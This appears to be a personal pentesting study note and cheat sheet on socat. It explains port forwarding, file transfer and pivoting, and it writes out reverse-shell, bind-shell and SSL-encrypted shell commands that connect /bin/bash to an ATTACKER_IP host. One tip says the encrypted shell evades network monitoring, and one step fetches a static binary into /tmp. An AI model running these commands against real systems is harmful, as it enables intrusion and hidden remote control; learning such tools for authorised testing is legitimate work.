# Socat — Socket Cat

#linux #cybersecurity #networking #reverse-shells #linux-basics-for-hackers

---

## 🗂️ Overview

**Socat** (SOcket CAT) is a command-line utility that creates **bidirectional data streams** between two endpoints. Think of it as `netcat` on steroids — it supports far more protocols, connection types, and options, making it one of the most versatile tools in a pentester's arsenal.

```
socat [options] <address1> <address2>
         │            │           │
         │            │           └── destination endpoint
         │            └── source endpoint
         └── relay data bidirectionally between the two
```

Every `socat` command connects **two addresses** and relays data between them in both directions.

---

## 🔌 Address Types

Socat supports a wide range of endpoint types:

|Address|Meaning|
|---|---|
|`TCP:host:port`|TCP connection to host:port|
|`TCP-LISTEN:port`|Listen for incoming TCP connection|
|`UDP:host:port`|UDP connection|
|`STDIN` / `STDOUT`|Standard input/output|
|`FILE:path`|Read/write a file|
|`EXEC:command`|Execute a command, relay its I/O|
|`PTY`|Pseudo-terminal (for stable shells)|
|`OPENSSL:host:port`|Encrypted SSL connection|
|`UNIX:path`|Unix domain socket|
|`PIPE:path`|Named pipe|

---

## 📡 Basic Usage

### Simple TCP connection (like netcat)

```bash
# Connect to a host on a port
socat - TCP:192.168.0.1:80

# Listen on a port
socat - TCP-LISTEN:4444

# The "-" means STDIN/STDOUT — your keyboard/terminal
```

### Port forwarding

```bash
# Forward local port 8080 to remote port 80
socat TCP-LISTEN:8080,fork TCP:192.168.0.1:80
```

`fork` is critical here — without it socat handles only **one connection** then exits. `fork` spawns a new process for each incoming connection.

### Relay between two ports (proxy)

```bash
# Anyone connecting to local 9000 gets forwarded to google.com:80
socat TCP-LISTEN:9000,fork TCP:google.com:80
```

---

## 💀 Reverse Shells

This is where socat shines in pentesting — creating **stable, fully interactive shells**.

### Standard reverse shell

```bash
# On attacker machine — listen
socat TCP-LISTEN:4444 -

# On target machine — connect back
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash
```

### Fully interactive TTY reverse shell ← the important one

```bash
# On attacker — listen with TTY
socat TCP-LISTEN:4444 FILE:`tty`,raw,echo=0

# On target — connect back with PTY
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

Breaking down the target command options:

|Option|Meaning|
|---|---|
|`pty`|Allocate a pseudo-terminal — makes it a real TTY|
|`stderr`|Redirect stderr through the socket too|
|`setsid`|Create a new session — detaches from parent process|
|`sigint`|Pass Ctrl+C to the remote shell instead of killing socat|
|`sane`|Set sane terminal settings|

> [!tip] Why this matters A standard netcat reverse shell is **not a real TTY** — `vim`, `sudo`, `ssh`, `top` won't work, Ctrl+C kills the shell, tab completion is broken. The socat PTY shell fixes all of this — it behaves like a real SSH session.

---

## 🔒 Encrypted Reverse Shell (SSL)

A plain reverse shell sends everything in **cleartext** — visible to IDS/IPS and network monitoring. Socat can encrypt the entire session with SSL.

### Generate a self-signed certificate (on attacker)

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem
```

### Encrypted listener (attacker)

```bash
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

### Encrypted reverse shell (target)

```bash
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

`verify=0` disables certificate verification — necessary since we're using a self-signed cert.

> [!tip] Hacking Note An SSL-encrypted socat shell looks like legitimate HTTPS traffic to most network monitoring tools — much harder to detect than a plain TCP reverse shell.

---

## 🚪 Bind Shell

A **bind shell** listens on the target and waits for the attacker to connect — the opposite of a reverse shell.

```bash
# On target — open a shell listener on port 4444
socat TCP-LISTEN:4444,fork EXEC:/bin/bash

# On attacker — connect to it
socat - TCP:TARGET_IP:4444
```

> [!warning] Bind shells are noisier than reverse shells — they open a listening port on the target, which is more likely to be detected by firewalls and monitoring tools.

---

## 📁 File Transfer

Socat can transfer files between machines without SCP or FTP.

```bash
# On receiver — listen and write to file
socat TCP-LISTEN:4444 > received_file.txt

# On sender — send file
socat - TCP:RECEIVER_IP:4444 < file_to_send.txt
```

### Transfer a binary (e.g. a tool to the target)

```bash
# On attacker (sending linpeas.sh)
socat TCP-LISTEN:4444,fork FILE:linpeas.sh

# On target (receiving)
socat TCP:ATTACKER_IP:4444 FILE:linpeas.sh,create
```

---

## 🔀 Port Forwarding & Pivoting

Socat is extremely useful for **pivoting** — routing traffic through a compromised machine to reach otherwise inaccessible internal networks.

```
Attacker → Compromised machine → Internal target
                  │
                  └── socat forwards the traffic
```

```bash
# On compromised machine
# Forward attacker's traffic on port 4444 → internal machine port 22
socat TCP-LISTEN:4444,fork TCP:192.168.1.10:22

# On attacker
# SSH through the compromised machine to the internal target
ssh -p 4444 user@COMPROMISED_IP
```

---

## 🖥️ Upgrading a Netcat Shell to Socat

If you already have a basic netcat shell on the target but socat is available:

```bash
# From inside the netcat shell, download socat if not installed
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat
chmod +x /tmp/socat

# Then spawn the full PTY shell
/tmp/socat TCP:ATTACKER_IP:4445 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

> [!tip] Hacking Note Static socat binaries exist that run without installation on any Linux system — very useful post-exploitation when you can't install packages.

---

## ⚖️ Socat vs Netcat

|Feature|Netcat|Socat|
|---|---|---|
|Basic TCP|✅|✅|
|UDP|✅|✅|
|SSL/TLS encryption|❌|✅|
|Full PTY shell|❌|✅|
|Port forwarding|Limited|✅|
|File transfer|✅|✅|
|Unix sockets|❌|✅|
|Complexity|Low|Medium|
|Pre-installed|Often|Rarely|

---

## 🔗 Command Cheat Sheet

```bash
# Basic connection
socat - TCP:host:port                                      # connect to host
socat - TCP-LISTEN:4444                                    # listen on port

# Port forwarding
socat TCP-LISTEN:8080,fork TCP:target:80                   # forward port

# Reverse shells
socat TCP-LISTEN:4444 FILE:`tty`,raw,echo=0                # attacker listener
socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane  # target

# Encrypted reverse shell
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0  # attacker
socat OPENSSL:ATTACKER:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane  # target

# Bind shell
socat TCP-LISTEN:4444,fork EXEC:/bin/bash                  # target listens
socat - TCP:TARGET:4444                                    # attacker connects

# File transfer
socat TCP-LISTEN:4444 > file.txt                           # receive
socat - TCP:HOST:4444 < file.txt                           # send

# Pivoting
socat TCP-LISTEN:4444,fork TCP:INTERNAL_IP:22              # on pivot machine
```

---

## 🔗 Related Notes

- [[LinuxCommands/Nmap]]
- [[Privilege Escalation Techniques]]
- [[Reverse Shells]]
- [[Finding_Files]]
- [[Text_Manipulation]]

---

_References: man socat · https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/socat · Linux Basics for Hacking — OccupyTheWeb_